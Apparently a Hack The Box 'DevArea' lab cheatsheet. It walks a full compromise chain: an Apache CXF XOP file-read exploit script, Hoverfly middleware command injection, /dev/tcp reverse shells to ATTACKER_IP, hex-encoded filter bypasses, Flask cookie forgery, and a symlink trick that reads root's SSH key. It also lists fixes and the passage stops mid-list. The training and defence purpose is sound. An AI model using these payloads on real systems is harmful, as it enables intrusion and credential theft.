> HTML Page: [[HTML Pages/HTB/HTB-DevArea.html|Open HTML Page]]

# HTB DevArea Technical Cheatsheet

## 1. Attack-Path Summary

```text
External reconnaissance
    ↓
Anonymous FTP access
    ↓
Download employee-service.jar
    ↓
Reverse-engineer JAR with JADX
    ↓
Identify Apache CXF 3.2.14 SOAP service
    ↓
CVE-2022-46364 XOP/MTOM arbitrary file read
    ↓
Read systemd units and /proc process command lines
    ↓
Recover Hoverfly credentials
    ↓
Authenticate to Hoverfly 1.11.3
    ↓
CVE-2025-54123 middleware command injection
    ↓
Shell as dev_ryan
    ↓
Discover localhost SysWatch Flask application
    ↓
Read world-readable /etc/syswatch.env
    ↓
Forge Flask session cookie
    ↓
Bypass weak service-name filter
    ↓
Command injection as syswatch
    ↓
Abuse root-run SysWatch log reader
    ↓
Two-hop symlink validation bypass
    ↓
Read root SSH private key
    ↓
SSH as root
```

---

## 2. Target Profile

| Item | Observation |
|---|---|
| Operating system | Ubuntu 24.04 |
| FTP | vsftpd 3.0.5 with anonymous access |
| SSH | OpenSSH |
| Port 80 | Apache static site |
| Port 8080 | Jetty-hosted Java SOAP service |
| Port 8500 | Hoverfly proxy listener |
| Port 8888 | Hoverfly dashboard and admin API |
| Local port 7777 | Flask/Werkzeug SysWatch application |
| Initial user | `dev_ryan` |
| Service account | `syswatch` |
| Root path | Unsafe symlink validation in a sudo-enabled log reader |
| Main vulnerabilities | CVE-2022-46364 and CVE-2025-54123 |

---

# 3. Reconnaissance

## 3.1 Full TCP Scan

```bash
sudo nmap -p- --reason --min-rate 10000 TARGET_IP
```

Expected attack surface:

```text
21/tcp    FTP
22/tcp    SSH
80/tcp    HTTP
8080/tcp  HTTP / Jetty
8500/tcp  Hoverfly proxy
8888/tcp  Hoverfly dashboard
```

## 3.2 Service and Default-Script Scan

```bash
sudo nmap -p 21,22,80,8080,8500,8888 -sCV TARGET_IP
```

### High-value findings

- Anonymous FTP authentication
- Redirect to `devarea.htb`
- Jetty version on TCP 8080
- Hoverfly dashboard on TCP 8888
- A proxy-only listener on TCP 8500
- Multiple web stacks on one host

## 3.3 Add the Required Hostname

```bash
echo "TARGET_IP devarea.htb" | sudo tee -a /etc/hosts
```

## 3.4 Multi-Port Virtual-Host Fuzzing

Test each HTTP port independently:

```bash
ffuf \
  -u http://TARGET_IP/ \
  -H "Host: FUZZ.devarea.htb" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -fs BASELINE_SIZE
```

Repeat for:

```text
8080
8500
8888
```

### Hint

Different applications may implement host routing independently. A virtual host absent on port 80 could still exist on another listener.

---

# 4. Web-Service Mapping

## 4.1 Port 80 — Static Apache Site

Inspect:

```bash
curl -I http://devarea.htb/
```

Content discovery:

```bash
feroxbuster -u http://devarea.htb -x html
```

### Interpretation

A site where all buttons lead nowhere and only static assets are found is usually low priority. Record it and move to the more unusual services.

## 4.2 Port 8080 — Jetty

Initial request:

```bash
curl -i http://devarea.htb:8080/
```

A default 404 does not prove the server has no application. Hidden routes may be recoverable from deployment artifacts, source code, or configuration.

## 4.3 Ports 8500 and 8888 — Hoverfly

```bash
curl -i http://devarea.htb:8888/
curl -i http://devarea.htb:8500/
```

Hoverfly normally separates:

| Port | Function |
|---|---|
| 8888 | Administrative API and dashboard |
| 8500 | HTTP simulation proxy |

A response stating that the server only accepts proxy requests is a product fingerprint.

---

# 5. Anonymous FTP Enumeration

## 5.1 Log In

```bash
ftp devarea.htb
```

Credentials:

```text
Username: anonymous
Password: blank or any email-like value
```

## 5.2 Enumerate

```text
ls
cd pub
ls
```

## 5.3 Download Files in Binary Mode

```text
binary
get employee-service.jar
```

Alternative:

```bash
wget ftp://anonymous:@devarea.htb/pub/employee-service.jar
```

### Operational lesson

Anonymous FTP often exposes deployment packages, backups, source archives, configuration exports, and build artifacts. Treat every binary as a potential map of a hidden service.

---

# 6. Java JAR Reverse Engineering

## 6.1 Basic Triage

```bash
file employee-service.jar
unzip -l employee-service.jar | less
```

Extract:

```bash
mkdir jar-extracted
cd jar-extracted
jar xf ../employee-service.jar
```

Search dependency metadata:

```bash
find . -iname 'pom.xml' -o -iname 'pom.properties'
grep -RniE 'artifactId|groupId|version' .
```

## 6.2 Decompile With JADX

```bash
jadx-gui employee-service.jar
```

CLI alternative:

```bash
jadx -d employee-service-src employee-service.jar
```

## 6.3 High-Value Questions

Determine:

- Main class
- Listening address
- Application route
- Framework and dependency versions
- Publicly exposed methods
- Expected data structures
- File, URL, XML, or deserialization handling
- Hardcoded credentials or secrets

## 6.4 Key Findings

The main class starts a JAX-WS service on:

```text
http://0.0.0.0:8080/employeeservice
```

WSDL:

```text
http://devarea.htb:8080/employeeservice?wsdl
```

The service exposes a method similar to:

```java
String submitReport(Report report);
```

The report contains:

```text
confidential
content
department
employeeName
```

The bundled Apache CXF version is:

```text
3.2.14
```

---

# 7. SOAP and WSDL Enumeration

## 7.1 Retrieve the WSDL

```bash
curl -s http://devarea.htb:8080/employeeservice?wsdl \
  | xmllint --format -
```

### Read the WSDL for

- Target namespace
- Operation name
- Parameter order
- Parameter types
- SOAP version
- Endpoint location
- Response structure

## 7.2 Baseline SOAP Request

Create `soap.xml`:

```xml
<soapenv:Envelope
    xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
    xmlns:dev="http://devarea.htb/">
  <soapenv:Body>
    <dev:submitReport>
      <arg0>
        <confidential>false</confidential>
        <content>test content</content>
        <department>IT</department>
        <employeeName>operator</employeeName>
      </arg0>
    </dev:submitReport>
  </soapenv:Body>
</soapenv:Envelope>
```

Send:

```bash
curl -s \
  http://devarea.htb:8080/employeeservice \
  -H 'Content-Type: text/xml' \
  --data-binary @soap.xml \
  | xmllint --format -
```

### Methodology lesson

Never begin with an exploit payload. First produce a valid request and record the normal response format.

---

# 8. CVE-2022-46364 — Apache CXF XOP/MTOM File Read

## 8.1 Vulnerability Concept

Apache CXF processes XOP references inside MTOM multipart SOAP requests.

Expected XOP reference:

```xml
<xop:Include href="cid:attachment-id"/>
```

Vulnerable versions also resolve URL schemes such as:

```text
file://
http://
https://
```

This can produce:

- Server-side request forgery
- Local file reads
- Internal-service access
- Cloud metadata access where reachable

## 8.2 Affected Version Logic

The target uses Apache CXF `3.2.14`, which predates the fixed branches.

Always verify the exact component version from:

```text
pom.properties
pom.xml
MANIFEST.MF
dependency metadata
application startup output
```

## 8.3 XOP File-Read Element

```xml
<employeeName>
  <xop:Include
      xmlns:xop="http://www.w3.org/2004/08/xop/include"
      href="file:///etc/passwd"/>
</employeeName>
```

A plain `text/xml` request fails because the XOP processing layer is not activated.

## 8.4 Required Multipart/Related Structure

Create `file-read.xml`:

```text
--MIME_boundary
Content-Type: application/xop+xml; charset=UTF-8; type="text/xml"
Content-Transfer-Encoding: 8bit
Content-ID: <root.message@cxf.apache.org>

<soapenv:Envelope
    xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
    xmlns:dev="http://devarea.htb/">
  <soapenv:Body>
    <dev:submitReport>
      <arg0>
        <confidential>false</confidential>
        <content>test content</content>
        <department>IT</department>
        <employeeName>
          <xop:Include
              xmlns:xop="http://www.w3.org/2004/08/xop/include"
              href="file:///etc/passwd"/>
        </employeeName>
      </arg0>
    </dev:submitReport>
  </soapenv:Body>
</soapenv:Envelope>
--MIME_boundary--
```

Send:

```bash
curl -s \
  http://devarea.htb:8080/employeeservice \
  -H 'Content-Type: multipart/related; type="application/xop+xml"; boundary="MIME_boundary"' \
  --data-binary @file-read.xml \
  | xmllint --format -
```

### Critical detail

Use:

```bash
--data-binary
```

Avoid:

```bash
-d
```

The MIME parser depends on exact line breaks and boundary formatting.

## 8.5 Decode the Reflected File

The file content may be returned as Base64 inside the SOAP response.

Example extraction pipeline:

```bash
curl -s \
  http://devarea.htb:8080/employeeservice \
  -H 'Content-Type: multipart/related; type="application/xop+xml"; boundary="MIME_boundary"' \
  --data-binary @file-read.xml \
  | xmllint --xpath "//*[local-name()='return']/text()" - \
  | cut -d' ' -f4 \
  | tr -d '.' \
  | base64 -d
```

### Robust parsing advice

The exact field position can change. A better script should:

1. Extract the `<return>` node.
2. Match a Base64-looking substring.
3. Validate its length.
4. Decode with error handling.
5. Preserve binary output when needed.

---

# 9. Reusable File-Read Script

```bash
#!/usr/bin/env bash
set -euo pipefail

target="${1:?Usage: $0 <absolute-file-path>}"
url="http://devarea.htb:8080/employeeservice"
boundary="MIME_boundary"

payload=$(cat <<EOF
--${boundary}
Content-Type: application/xop+xml; charset=UTF-8; type="text/xml"
Content-Transfer-Encoding: 8bit
Content-ID: <root.message@cxf.apache.org>

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:dev="http://devarea.htb/">
  <soapenv:Body>
    <dev:submitReport>
      <arg0>
        <confidential>false</confidential>
        <content>test content</content>
        <department>IT</department>
        <employeeName><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file://${target}"/></employeeName>
      </arg0>
    </dev:submitReport>
  </soapenv:Body>
</soapenv:Envelope>
--${boundary}--
EOF
)

response=$(curl -s \
  "$url" \
  -H "Content-Type: multipart/related; type=\"application/xop+xml\"; boundary=\"${boundary}\"" \
  --data-binary "$payload")

encoded=$(printf '%s' "$response" \
  | xmllint --xpath "//*[local-name()='return']/text()" - 2>/dev/null \
  | grep -oE '[A-Za-z0-9+/]{20,}={0,2}' \
  | head -n1)

if [[ -z "$encoded" ]]; then
  echo "[-] No Base64 payload recovered" >&2
  exit 1
fi

printf '%s' "$encoded" | base64 -d
```

Usage:

```bash
chmod +x file_read.sh
./file_read.sh /etc/passwd
```

---

# 10. Arbitrary File-Read Methodology

## 10.1 Start With Predictable Files

```text
/etc/passwd
/etc/hostname
/etc/os-release
/proc/self/cmdline
/proc/self/environ
```

## 10.2 Enumerate Web and Service Configuration

```text
/etc/apache2/sites-enabled/*.conf
/etc/nginx/sites-enabled/*
/etc/systemd/system/*.service
/lib/systemd/system/*.service
/opt/*/
/var/www/*
```

## 10.3 Enumerate User Files

```text
/home/USERNAME/.profile
/home/USERNAME/.bashrc
/home/USERNAME/.ssh/authorized_keys
/home/USERNAME/.ssh/id_ed25519
/home/USERNAME/.ssh/id_rsa
```

File permissions still apply. The vulnerable service reads with the privileges of its process account.

## 10.4 High-Value `/proc` Files

```text
/proc/self/cmdline
/proc/self/environ
/proc/PID/cmdline
/proc/PID/environ
/proc/PID/status
/proc/PID/cwd
```

### Why `/proc` matters

Service credentials are frequently exposed through:

- Command-line arguments
- Environment variables
- Working-directory paths
- Runtime configuration
- Parent-process relationships

---

# 11. Process Enumeration Through File Read

## 11.1 Read the Current Command Line

```bash
./file_read.sh /proc/self/cmdline | tr '\0' ' '
```

## 11.2 Read the Current Environment

```bash
./file_read.sh /proc/self/environ | tr '\0' '\n'
```

## 11.3 Brute-Force Process IDs

```bash
#!/usr/bin/env bash
set -u

for pid in $(seq 1 9999); do
    result=$(./file_read.sh "/proc/${pid}/cmdline" 2>/dev/null \
        | tr '\0' ' ' || true)

    if [[ -n "${result//$'\n'/}" ]]; then
        printf '%05d %s\n' "$pid" "$result"
    fi
done
```

### What to hunt for

```text
-password
--password
-token
--token
-secret
--secret
-key
--key
-username
--username
DATABASE_URL
API_KEY
```

### DevArea finding

Hoverfly was started with credentials directly in its process arguments.

---

# 12. Reading systemd Unit Files

Once a service path or name is known, test:

```text
/etc/systemd/system/SERVICE.service
/lib/systemd/system/SERVICE.service
/usr/lib/systemd/system/SERVICE.service
```

Typical high-value directives:

```ini
User=
Group=
WorkingDirectory=
Environment=
EnvironmentFile=
ExecStart=
ExecStartPre=
```

A unit can disclose:

- Credentials
- Service account
- Binary path
- Configuration path
- Environment files
- Listening arguments

### Security lesson

Secrets should not be placed in `ExecStart` command-line arguments. Process listings and `/proc` can expose them.

---

# 13. Hoverfly Enumeration

## 13.1 Authenticate

Dashboard:

```text
http://devarea.htb:8888/
```

Credentials may be recovered from:

```text
/proc/PID/cmdline
systemd units
shell history
configuration files
deployment scripts
```

## 13.2 Determine the Version

Use:

```text
Dashboard footer
API endpoint
Binary version command
VERSION.txt
Package metadata
```

Target version:

```text
1.11.3
```

---

# 14. CVE-2025-54123 — Hoverfly Middleware RCE

## 14.1 Vulnerability Concept

The authenticated middleware API accepts attacker-controlled values resembling:

```json
{
  "binary": "/bin/bash",
  "script": "id"
}
```

Hoverfly writes the supplied script to a temporary file and invokes:

```text
binary temporary_script_file
```

Insufficient validation allows command execution with the Hoverfly process privileges.

## 14.2 Endpoint

```text
PUT /api/v2/hoverfly/middleware
```

## 14.3 Proof of Execution

```json
{
  "binary": "/bin/bash",
  "script": "id"
}
```

Send through Burp Repeater or `curl` with the authenticated session.

Generic request:

```bash
curl -i \
  -X PUT \
  http://devarea.htb:8888/api/v2/hoverfly/middleware \
  -H 'Content-Type: application/json' \
  -H 'Cookie: SESSION_COOKIE_HERE' \
  --data '{"binary":"/bin/bash","script":"id"}'
```

### Important response behavior

An error such as HTTP `422` does not mean the command failed. Inspect the response body for captured standard output or standard error.

## 14.4 Reverse Shell

Listener:

```bash
nc -lvnp 443
```

Payload body:

```json
{
  "binary": "/bin/bash",
  "script": "bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1"
}
```

Resulting shell:

```text
dev_ryan
```

---

# 15. Shell Stabilization

```bash
script /dev/null -c bash
```

Then:

```text
Ctrl+Z
```

Local terminal:

```bash
stty raw -echo
fg
```

Reset:

```bash
reset
```

Set terminal properties:

```bash
export TERM=xterm
export SHELL=/bin/bash
stty rows 40 columns 120
```

---

# 16. Local Enumeration as `dev_ryan`

## 16.1 Baseline

```bash
id
whoami
hostname
uname -a
cat /etc/os-release
```

## 16.2 Sudo

```bash
sudo -l
```

DevArea exposes a root-run management script:

```text
/opt/syswatch/syswatch.sh
```

Some subcommands are denied, but most remain available.

## 16.3 Filesystem

```bash
ls -la /opt
find /opt -maxdepth 3 -type f -ls 2>/dev/null
```

Notable locations:

```text
/opt/EmployeeService
/opt/HoverFly
/opt/syswatch
```

## 16.4 Access Control Lists

A trailing `+` in `ls -l` output indicates additional ACLs:

```bash
ls -ld /opt/syswatch
getfacl /opt/syswatch
```

### Lesson

Traditional Unix mode bits do not show the complete permission model. Use `getfacl` when access contradicts the visible owner/group/other permissions.

## 16.5 Local Listeners

```bash
ss -lntup
netstat -lntup
```

Target:

```text
127.0.0.1:7777
```

## 16.6 Processes

```bash
ps auxww
ps -ef --forest
```

The local service runs as:

```text
syswatch
```

---

# 17. Accessing a Localhost-Only Web Application

## 17.1 SSH Local Port Forwarding

After adding or obtaining an SSH key:

```bash
ssh \
  -L 7777:127.0.0.1:7777 \
  -i PRIVATE_KEY \
  dev_ryan@devarea.htb
```

Browse:

```text
http://127.0.0.1:7777/
```

## 17.2 CLI Alternative

```bash
curl -i http://127.0.0.1:7777/
```

## 17.3 SOCKS Alternative

```bash
ssh -D 1080 -i PRIVATE_KEY dev_ryan@devarea.htb
```

Then configure the browser or ProxyChains to use:

```text
127.0.0.1:1080
```

---

# 18. Custom Application Source Review

A source archive was available in the user’s home directory:

```text
syswatch-v1.zip
```

Extract:

```bash
unzip syswatch-v1.zip -d syswatch-src
cd syswatch-src
find . -maxdepth 3 -type f -print
```

## 18.1 Review Order

1. Installation script
2. Service units
3. Environment files
4. Main application entry point
5. Authentication logic
6. Routes accepting user input
7. Shell invocation
8. Privileged management scripts
9. Writable directories
10. Timers and cron jobs

## 18.2 Search Patterns

```bash
grep -RniE \
  'subprocess|os\.system|shell=True|eval|exec|secret_key|password|session|sudo|chmod|chown|ln -s|readlink|realpath' \
  .
```

---

# 19. World-Readable Environment File

The setup script created:

```text
/etc/syswatch.env
```

and assigned unsafe permissions.

Inspect:

```bash
ls -l /etc/syswatch.env
cat /etc/syswatch.env
```

Likely secrets:

```text
SYSWATCH_SECRET_KEY
SYSWATCH_ADMIN_PASSWORD
SYSWATCH_LOG_DIR
SYSWATCH_DB_PATH
SYSWATCH_PLUGIN_DIR
SYSWATCH_BACKUP_DIR
```

### Security lesson

Environment files containing secrets should generally be:

```text
root-owned
mode 0600 or 0640
restricted to the exact service group
```

---

# 20. Flask Session Forgery

## 20.1 Flask Cookie Model

Default Flask sessions are:

- Client-side
- Signed
- Not encrypted
- Trusted if the signature is valid

If the Flask `secret_key` is exposed, an attacker can create arbitrary valid session data.

## 20.2 Determine Required Session Keys

Review the authentication code:

```python
session["user_id"] = row[0]
session["username"] = username
```

Authorization check:

```python
if not session.get("user_id"):
    return redirect(url_for("login"))
```

Minimal useful session:

```json
{
  "user_id": 1,
  "username": "admin"
}
```

## 20.3 Forge With `flask-unsign`

Install:

```bash
python3 -m pip install flask-unsign
```

Generate:

```bash
flask-unsign \
  --sign \
  --cookie '{"user_id":1,"username":"admin"}' \
  --secret 'FLASK_SECRET'
```

Set the resulting value as:

```text
session=FORGED_COOKIE
```

## 20.4 Forge With Python

```python
from flask import Flask
from flask.sessions import SecureCookieSessionInterface

app = Flask(__name__)
app.secret_key = "FLASK_SECRET"

serializer = SecureCookieSessionInterface().get_signing_serializer(app)

cookie = serializer.dumps({
    "user_id": 1,
    "username": "admin",
})

print(cookie)
```

Run:

```bash
python3 generate_cookie.py
```

### Key lesson

A strong random secret provides no protection once it is world-readable.

---

# 21. SysWatch Command Injection

## 21.1 Vulnerable Pattern

```python
service = request.form.get("service", "").strip()

subprocess.run(
    [f"systemctl status --no-pager {service}"],
    shell=True,
    capture_output=True,
    text=True,
    timeout=10,
)
```

The application:

1. Builds one command string.
2. Enables `shell=True`.
3. Inserts user-controlled data.
4. Relies on a blacklist regex.

This is a classic command-injection design flaw.

## 21.2 Weak Filter

Conceptual pattern:

```python
re.compile(r"^[^;/\&.<>\rA-Z]*$")
```

Blocked examples:

```text
;
/
&
.
<
>
carriage return
uppercase letters
```

Not blocked:

```text
|
$()
backticks
spaces
lowercase commands
```

## 21.3 Proof of Concept

```text
service=$(id)
```

or:

```text
service=x|id
```

### Why the pipe works

The intended `systemctl` command fails or produces output, then the shell pipes it into the attacker-selected command.

---

# 22. Filter-Bypass Methodology

## 22.1 Identify the Actual Shell

Python:

```python
subprocess.run(..., shell=True)
```

normally invokes:

```text
/bin/sh
```

On Ubuntu, `/bin/sh` commonly points to Dash.

Check:

```bash
ls -l /bin/sh
```

### Consequence

Bash-only syntax may fail unless Bash is explicitly re-invoked.

## 22.2 Generate a Slash Without Typing `/`

Method 1:

```bash
$(pwd|cut -c1)
```

The first character of an absolute working directory is `/`.

Example:

```text
$(pwd|cut -c1)tmp$(pwd|cut -c1)payload
```

Method 2, after explicitly invoking Bash:

```bash
$'\x2f'
```

## 22.3 Avoid Blocked Uppercase Characters

Base64 output may contain uppercase characters. Hex uses only:

```text
0-9
a-f
```

Encode:

```bash
echo 'bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1' \
  | xxd -p -c 0
```

Decode and execute:

```text
service=x|echo HEX_PAYLOAD|xxd -r -p|bash
```

## 22.4 Staged Payload

Create:

```bash
cat >/tmp/rev <<'EOF'
#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
EOF

chmod +x /tmp/rev
```

Trigger using slash reconstruction:

```text
service=x|$(pwd|cut -c1)tmp$(pwd|cut -c1)rev
```

Resulting shell:

```text
syswatch
```

---

# 23. Why Blacklists Fail

A blacklist must account for:

- Alternate shell metacharacters
- Command substitution
- Pipes
- Newlines
- Encodings
- Environment expansion
- Globbing
- Shell differences
- Unicode normalization
- Executable lookup through `PATH`
- Argument injection

Correct design:

```python
subprocess.run(
    ["systemctl", "status", "--no-pager", validated_service],
    shell=False,
    check=False,
    capture_output=True,
    text=True,
)
```

Also use a strict allowlist:

```python
ALLOWED_SERVICES = {
    "apache2",
    "ssh",
    "hoverfly",
}
```

---

# 24. SysWatch Privilege-Escalation Enumeration

## 24.1 Writable Paths

```bash
find /opt/syswatch -writable -ls 2>/dev/null
```

High-value directories:

```text
/opt/syswatch/logs
/opt/syswatch/backup
```

## 24.2 Root-Run Components

Inspect:

```bash
systemctl cat syswatch-monitor.service
systemctl cat syswatch-monitor.timer
```

The monitor job runs as root on a timer.

### Red herring analysis

The root timer executes plugin scripts, but the plugin directory is not writable. Do not force a path that fails its prerequisites.

## 24.3 Sudo-Enabled Script

```bash
sudo -l
sudo /opt/syswatch/syswatch.sh --help
```

Review each allowed action independently:

```text
web
web-status
plugin
plugins
logs
```

`logs` is the productive path because it reads files as root.

---

# 25. Unsafe Symlink Validation

## 25.1 Vulnerable Logic

The root script:

1. Accepts a filename.
2. Builds a path under a writable log directory.
3. Detects a symlink.
4. Uses `ls -l | awk '{print $NF}'` to extract its target.
5. Validates only that immediate target.
6. Uses `-f` and `cat`, which follow additional symlinks.

Conceptual vulnerable code:

```bash
target=$(ls -l "$path" | awk '{print $NF}')

if [[ "$target" =~ ^[A-Za-z0-9_.-]+$ ]]; then
    resolved="$LOG_DIR/$target"

    if [ -f "$resolved" ]; then
        cat "$resolved"
    fi
fi
```

## 25.2 Root Cause

The code checks only one symlink hop.

Chain:

```text
flag.log → redirect → /root/.ssh/id_ed25519
```

The first target, `redirect`, passes the filename regex. The later file check and `cat` follow the second link to the protected file.

## 25.3 Demonstration

```bash
ln -s b a
ln -s /etc/passwd b
```

Unsafe inspection:

```bash
ls -l a | awk '{print $NF}'
```

Output:

```text
b
```

Safe resolution:

```bash
readlink -f a
realpath a
```

Output:

```text
/etc/passwd
```

---

# 26. Two-Hop Symlink Exploit

Run as the account controlling the writable log directory:

```bash
cd /opt/syswatch/logs

ln -s redirect flag.log
ln -s /etc/shadow redirect
```

Verify:

```bash
ls -l flag.log redirect
```

Read as root through the sudo-enabled command:

```bash
sudo /opt/syswatch/syswatch.sh logs flag.log
```

## 26.1 Read the Root Authorized Key

```bash
ln -sf redirect flag.log
ln -sf /root/.ssh/authorized_keys redirect

sudo /opt/syswatch/syswatch.sh logs flag.log
```

This confirms the root SSH directory and key type.

## 26.2 Read the Root Private Key

```bash
ln -sf redirect flag.log
ln -sf /root/.ssh/id_ed25519 redirect

sudo /opt/syswatch/syswatch.sh logs flag.log \
  > /tmp/root-id_ed25519
```

On the attacker system, save the recovered key:

```bash
chmod 600 root-id_ed25519
ssh -i root-id_ed25519 root@devarea.htb
```

---

# 27. Safer Symlink Handling

## 27.1 Canonicalize the Full Path

```bash
resolved=$(realpath -e -- "$path")
```

or:

```bash
resolved=$(readlink -f -- "$path")
```

## 27.2 Enforce Directory Containment

```bash
log_root=$(realpath -e -- "$LOG_DIR")
resolved=$(realpath -e -- "$path")

case "$resolved" in
    "$log_root"/*) ;;
    *)
        echo "Path escapes log directory" >&2
        exit 1
        ;;
esac
```

## 27.3 Refuse Any Symlink

Where symlinks are not required:

```bash
if [[ -L "$path" ]]; then
    echo "Symlinks are not allowed" >&2
    exit 1
fi
```

### Race-condition warning

Check-then-open logic may still be vulnerable to time-of-check/time-of-use attacks. High-assurance code should use safe file-descriptor APIs such as:

```text
openat()
O_NOFOLLOW
directory file descriptors
```

---

# 28. Tool Reference

| Tool | Use |
|---|---|
| `nmap` | Full-port and service enumeration |
| `ffuf` | Virtual-host fuzzing |
| `feroxbuster` | Directory and file discovery |
| `ftp` | Anonymous FTP enumeration |
| `wget` | Noninteractive FTP download |
| `file` | Artifact type identification |
| `jar` / `unzip` | JAR extraction |
| `jadx-gui` | Java decompilation and code browsing |
| `grep` | Dependency and source-code searching |
| `curl` | SOAP, API, and web requests |
| `xmllint` | WSDL and SOAP parsing |
| `base64` | Decode reflected file content |
| Burp Proxy | Capture authenticated requests |
| Burp Repeater | Modify Hoverfly and SysWatch requests |
| `nc` | Reverse-shell listener |
| `script` | Pseudo-terminal allocation |
| `ps` | Process enumeration |
| `/proc` | Process command-line and environment discovery |
| `ss` / `netstat` | Local service discovery |
| `getfacl` | ACL inspection |
| `sqlite3` | Local application-database review |
| `flask-unsign` | Flask session decoding and signing |
| `xxd` | Lowercase-safe hex encoding and decoding |
| `readlink` / `realpath` | Canonical path and symlink analysis |
| `ssh -L` | Local port forwarding |
| `sudo -l` | Privileged-command discovery |

---

# 29. Reusable Attack Checklist

## Recon

- [ ] Scan every TCP port
- [ ] Run service detection
- [ ] Record redirects and hostnames
- [ ] Identify every HTTP listener
- [ ] Test anonymous FTP
- [ ] Download all exposed artifacts
- [ ] Fuzz each web port independently

## Java and SOAP

- [ ] Decompile the JAR
- [ ] Find the main class
- [ ] Identify the service route
- [ ] Extract dependency versions
- [ ] Retrieve the WSDL
- [ ] Build a valid SOAP request
- [ ] Research the exact Apache CXF version
- [ ] Test XOP only inside a multipart MTOM request
- [ ] Preserve MIME line endings
- [ ] Decode reflected Base64

## File Read

- [ ] Read `/etc/passwd`
- [ ] Read `/proc/self/cmdline`
- [ ] Read `/proc/self/environ`
- [ ] Enumerate `/proc/PID/cmdline`
- [ ] Read systemd service files
- [ ] Search for command-line credentials
- [ ] Test user home-directory access
- [ ] Record files blocked by Unix permissions

## Hoverfly

- [ ] Recover credentials
- [ ] Confirm the version
- [ ] Authenticate to the dashboard
- [ ] Capture the session
- [ ] Test the middleware API with `id`
- [ ] Inspect error responses for stdout
- [ ] Trigger a reverse shell
- [ ] Stabilize the terminal

## SysWatch

- [ ] Run `sudo -l`
- [ ] Inspect ACLs
- [ ] Enumerate localhost listeners
- [ ] Recover source archives
- [ ] Review installation scripts
- [ ] Inspect environment-file permissions
- [ ] Recover the Flask secret
- [ ] Forge a session cookie
- [ ] Inspect `shell=True` calls
- [ ] Map blocked and allowed characters
- [ ] Reconstruct blocked characters
- [ ] Obtain a shell as the service account

## Root

- [ ] Identify writable directories used by root
- [ ] Review every sudo-enabled subcommand
- [ ] Ignore root timers without a writable execution path
- [ ] Audit symlink resolution
- [ ] Test multi-hop symlinks
- [ ] Read a low-risk root file first
- [ ] Confirm the root SSH key type
- [ ] Read the matching private key
- [ ] Apply mode `0600`
- [ ] Connect over SSH

---

# 30. High-Value Hints

1. **Multiple stacks imply multiple independent attack surfaces.** Apache, Jetty, Go, and Flask should be treated as separate applications.

2. **A blank Jetty root is not an empty server.** Deployment artifacts can disclose the exact hidden context path.

3. **Build artifacts are often better than banner grabbing.** A JAR exposes classes, routes, method signatures, and precise dependency versions.

4. **Read the WSDL before touching SOAP payloads.** It eliminates guesswork around namespaces, operations, and parameter order.

5. **XOP requires the correct transport format.** An `<xop:Include>` element inside ordinary XML does not automatically invoke MTOM handling.

6. **Use `--data-binary` for MIME payloads.** Quiet newline normalization can invalidate multipart parsing.

7. **Arbitrary file read is a credential-discovery primitive.** Systemd units and `/proc` often produce faster results than blindly guessing private keys.

8. **Process arguments are not secret storage.** Credentials passed to command-line flags may be exposed to local users.

9. **Error responses can prove execution.** A status code such as `422` may include command output.

10. **Localhost services become reachable after the first shell.** Repeat network enumeration locally.

11. **ACLs override simplistic permission assumptions.** A directory may look world-readable while explicitly denying one user.

12. **Source archives convert black-box work into white-box review.** Prioritize them over blind fuzzing.

13. **Flask cookies are signed, not encrypted.** A leaked secret means authentication state can be forged.

14. **Password failure does not end the authentication path.** Review the session model and authorization checks.

15. **`shell=True` plus string interpolation is the vulnerability.** Blacklist quality is secondary.

16. **Know whether the shell is Dash or Bash.** Payload syntax depends on the interpreter.

17. **Hex is valuable when uppercase characters are blocked.** It remains compatible with lowercase-only filters.

18. **The first slash can be derived from `pwd`.** Shell expansion creates characters the application tried to ban.

19. **Root timers are not automatically exploitable.** Confirm control over an executed file or input.

20. **Never parse symlinks with `ls`.** Use `readlink` or `realpath`.

21. **Validate the final canonical target, not the first hop.** A benign-looking symlink can point to another symlink.

22. **Root file read often becomes root shell.** Prioritize SSH keys, credentials, service tokens, and privileged configuration.

---

# 31. Defensive Takeaways

## FTP

- Disable anonymous FTP unless explicitly required.
- Do not publish deployment artifacts.
- Remove backups and build packages from public shares.
- Monitor access to source and binary artifacts.

## Java and Apache CXF

- Upgrade Apache CXF to a fixed release.
- Disable unnecessary MTOM processing.
- Restrict URL schemes accepted in XOP references.
- Block access to local files and internal URLs.
- Log unusual `multipart/related` SOAP requests.
- Alert on `file://` inside XOP elements.

## Service Secrets

- Never place passwords in process arguments.
- Use protected credential files or secret managers.
- Restrict `/proc` visibility where operationally appropriate.
- Run services with least privilege.

## Hoverfly

- Upgrade beyond vulnerable versions.
- Disable middleware-management endpoints unless required.
- Bind administrative interfaces to trusted networks.
- Enforce strong authentication.
- Audit changes to middleware configuration.
- Alert on shell binaries used as middleware interpreters.

## Flask

- Protect the Flask secret with restrictive file permissions.
- Rotate the secret after suspected exposure.
- Do not rely on client-side session data for sensitive authorization without server-side validation.
- Avoid default fallback secrets such as `change-me`.
- Consider server-side sessions for high-value applications.

## Command Execution

- Never use `shell=True` with attacker-controlled strings.
- Pass argument arrays directly.
- Use strict allowlists.
- Validate semantic service names rather than filtering characters.
- Drop service privileges and constrain execution with MAC policies.

## Privileged Scripts

- Minimize `NOPASSWD` sudo rules.
- Permit exact commands and exact argument patterns.
- Avoid root file readers over user-writable directories.
- Reject symlinks or canonicalize the full target.
- Use file-descriptor-based APIs to prevent races.
- Audit all root scripts that consume files from writable paths.

---

# 32. Minimal Command Sequence

```bash
# Recon
sudo nmap -p- --reason --min-rate 10000 TARGET_IP
sudo nmap -p 21,22,80,8080,8500,8888 -sCV TARGET_IP
echo "TARGET_IP devarea.htb" | sudo tee -a /etc/hosts

# FTP
ftp devarea.htb
# anonymous → cd pub → binary → get employee-service.jar

# Reverse engineering
jadx-gui employee-service.jar

# WSDL
curl -s http://devarea.htb:8080/employeeservice?wsdl \
  | xmllint --format -

# CXF file read
./file_read.sh /etc/passwd
./file_read.sh /proc/self/cmdline | tr '\0' ' '
./file_read.sh /proc/self/environ | tr '\0' '\n'

# Hoverfly
